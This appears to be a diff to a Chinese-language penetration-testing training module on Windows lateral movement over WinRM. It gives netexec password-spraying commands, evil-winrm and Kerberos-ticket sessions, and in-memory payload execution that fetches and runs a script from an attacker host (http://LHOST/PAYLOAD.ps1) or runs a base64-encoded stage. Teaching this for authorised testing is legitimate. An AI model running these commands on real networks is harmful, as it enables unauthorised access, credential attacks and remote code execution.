@@ -6,6 +6,8 @@
 
 > **覆盖场景：** 56
 >
+> **教材依据：** 第 18 章《Windows 横向移动》——教材的无文件横向移动是 §18.2（基于服务控制管理器 SCM），WinRM / PowerShell Remoting 本身没有独立小节，本模块把它当作传输通道使用。
+>
 > **前置依赖：** 已有一组合法凭据（密码 / NTLM 哈希 / Kerberos 票据）；目标 5985（HTTP）或 5986（HTTPS）可达；攻击机为 Kali（含 evil-winrm、netexec、impacket）或一台已控 Windows 跳板
 
 ---
@@ -49,7 +51,7 @@
    netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
    ```
    期望输出：`[+] TARGET:5985 - ... (Pwn3d!)`。`(Pwn3d!)` 表示该账户在本地管理员组；没有该标记但仍能认证时，命令可能仍可执行（Remote Management Users 非管理员也能跑 WinRM），下面步骤 3 会真正验证。
-2. **（备选批量）多目标/喷密码**：见 cheat sheet `WinRM password spraying`/`Multiple targets with WinRM`：
+2. **（备选批量）多目标/喷密码**：见速查章节 `WinRM password spraying`/`Multiple targets with WinRM`：
    ```bash
    netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
    ```
@@ -185,8 +187,8 @@ if (-not $UseSSL -and -not $http.TcpTestSucceeded) { $UseSSL = $true }  # 只有
 Write-Ok "端口可达（5985=$($http.TcpTestSucceeded) 5986=$($https.TcpTestSucceeded)），使用 $($(if($UseSSL){'HTTPS'}else{'HTTP'}))。"
 
 # ---------- 2. 认证形态分发 ----------
-$sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60
-if ($UseSSL) { $sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60 -SkipCACheck -SkipCNCheck }
+$sessionOption = New-PSSessionOption -OperationTimeout 00:01:00 -OpenTimeout 00:01:00
+if ($UseSSL) { $sessionOption = New-PSSessionOption -OperationTimeout 00:01:00 -OpenTimeout 00:01:00 -SkipCACheck -SkipCNCheck }
 
 $cred = $null
 if ($Pass) {
@@ -365,8 +367,10 @@ evil-winrm 会话内：
 # 下载执行 .ps1
 IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
 
-# 不想落地又不依赖文件：直接反向连接一行（msfvenom 生成后 base64）
-$b = [Convert]::FromBase64String('...'); $m=[System.Diagnostics.Process]::GetCurrentProcess(); ...
+# 不落盘：在内存里执行 base64 包装的脚本（UTF-16LE，-enc 的编码）
+# 攻击机：iconv -t UTF-16LE stage2.ps1 | base64 -w0
+$b64 = 'BASE64'
+IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64)))
 ```
 
 ### 5.2 落地执行（确需文件时：目标自己出网下载，禁止走 \\LHOST\share）
@@ -424,7 +428,7 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/PAYLOAD.exe
 - **先确认 SMB 真的不通**再放弃 PsExec 系——多数考生丢分是没做端口判断就在错误通道上死磕。`nmap -Pn -p445,5985 TARGET` 一次说清。
 - 5985 走 WinRM 会在目标留下 PowerShell 会话与 4624/4625 登录日志、`Microsoft-Windows-WinRM` 操作日志；哈希线（NTLM）在 DC 上留 4776。批量喷密码（步骤 2）会把账户锁风险放大，**仅在明确允许且次数受控时用**。
 - evil-winrm 的 `upload`/`download`、`scripts`/`loot` 只在会话内有效：文件走 WinRM 通道，**别**在文档/笔记里写"经 SMB 共享传文件"这类与本场景矛盾的步骤。
-- 会话是交互式的：执行长时间任务（如 mimikatz sekurlsa）在 evil-winrm 里容易卡/超时，参考 cheat sheet `Having an Evil-WinRM session` 的建议——拆成一行命令执行、结果即时抄录，或把输出重定向到文件再 `download`。
+- 会话是交互式的：执行长时间任务（如 mimikatz sekurlsa）在 evil-winrm 里容易卡/超时，参考速查章节 `Having an Evil-WinRM session` 的建议——拆成一行命令执行、结果即时抄录，或把输出重定向到文件再 `download`。
 - 域名/主机名解析在 Kerberos 线是硬前置；Kali 记得把目标主机名写进 `/etc/hosts`，否则 SPN 解析失败报 `KRB_AP_ERR_MODIFIED` 之类，先查时钟。
 - 非管理员会话里别立刻上提权/抓密码工具，先按最小权限做信息收集，再决定是否需要模块 M06 的提权路径。
 
@@ -450,13 +454,17 @@ evil-winrm -i TARGET -u USER -p 'PASS' -S        # 5986 HTTPS
 impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
 export KRB5CCNAME=$(pwd)/USER.ccache
 netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
+```
 
+```powershell
 # 5) 会话内内存投放（首选，不落盘）
 IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
 
 # 6) Windows 跳板线
 winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
-$s = New-PSSession -ComputerName TARGET -Credential (DOMAIN\USER,PASS)
+$pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
+$c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $pw)
+$s  = New-PSSession -ComputerName TARGET -Credential $c
 Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
 
 # 7) 落盘备选（目标自己出网下载）
